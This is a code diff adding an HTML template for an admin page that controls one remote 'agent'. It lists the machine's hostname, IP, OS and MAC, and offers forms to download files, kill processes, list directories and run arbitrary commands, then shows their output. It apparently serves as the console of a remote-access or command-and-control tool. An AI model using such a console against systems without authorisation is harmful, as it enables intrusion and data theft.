@@ -1,0 +1,74 @@
+{% extends "layouts/base.html" %}
+
+{% block title %} Agent {{ agent['id'] }} {% endblock %}
+
+{% block content %}
+<div class="container py-4">
+  <h3>Agent {{ agent['id'] }}</h3>
+  <ul>
+    <li><strong>Hostname:</strong> {{ agent['hostname'] }}</li>
+    <li><strong>IP:</strong> {{ agent['ip'] }}</li>
+    <li><strong>OS:</strong> {{ agent['os'] }}</li>
+    <li><strong>MAC:</strong> {{ agent['mac'] }}</li>
+    <li><strong>Last Seen:</strong> {{ agent['last_seen'] }}</li>
+  </ul>
+
+  <h5 class="mt-4">Actions</h5>
+
+  <form method="POST" action="/admin/download">
+    <input type="hidden" name="agent_id" value="{{ agent['id'] }}">
+    <input type="hidden" name="agent_url" value="{{ agent['url'] }}">
+    <div class="input-group mb-3">
+      <input type="text" class="form-control" name="file_path" placeholder="C:/Users/Agent/Documents/file.txt" required>
+      <button class="btn btn-primary" type="submit">📥 Download File</button>
+    </div>
+  </form>
+
+  <form method="POST" action="/admin/kill">
+    <input type="hidden" name="agent_id" value="{{ agent['id'] }}">
+    <input type="hidden" name="agent_url" value="{{ agent['url'] }}">
+    <div class="input-group mb-3">
+      <input type="text" class="form-control" name="pid" placeholder="Enter PID to kill" required>
+      <button class="btn btn-danger" type="submit">❌ Kill Process</button>
+    </div>
+  </form>
+
+  <form method="POST" action="/admin/processes">
+    <input type="hidden" name="agent_id" value="{{ agent['id'] }}">
+    <input type="hidden" name="agent_url" value="{{ agent['url'] }}">
+    <button class="btn btn-info mb-3">🧠 Show Processes</button>
+  </form>
+
+  <form method="POST" action="/admin/list_dir">
+    <input type="hidden" name="agent_id" value="{{ agent['id'] }}">
+    <input type="hidden" name="agent_url" value="{{ agent['url'] }}">
+    <div class="input-group mb-3">
+      <input type="text" class="form-control" name="dir_path" placeholder="C:/Users/Agent/Desktop" required>
+      <button class="btn btn-secondary" type="submit">📁 Show Directory</button>
+    </div>
+  </form>
+
+  <form method="POST" action="/admin/exec">
+    <input type="hidden" name="agent_id" value="{{ agent['id'] }}">
+    <input type="hidden" name="agent_url" value="{{ agent['url'] }}">
+    <div class="input-group mb-3">
+      <input type="text" class="form-control" name="command" placeholder="Enter command (e.g., whoami)" required>
+      <button class="btn btn-warning" type="submit">▶ Run Command</button>
+    </div>
+  </form>
+
+  {% if exec_output %}
+  <div class="card mt-4">
+    <div class="card-header bg-gradient-info text-white">
+      📤 Command Output
+    </div>
+    <div class="card-body" style="max-height: 400px; overflow-y: auto;">
+      <pre style="white-space: pre-wrap; font-family: monospace; background-color: #f8f9fa; padding: 1rem; border-radius: 5px;">
+{{ exec_output }}
+      </pre>
+    </div>
+  </div>
+  {% endif %}
+
+</div>
+{% endblock %}
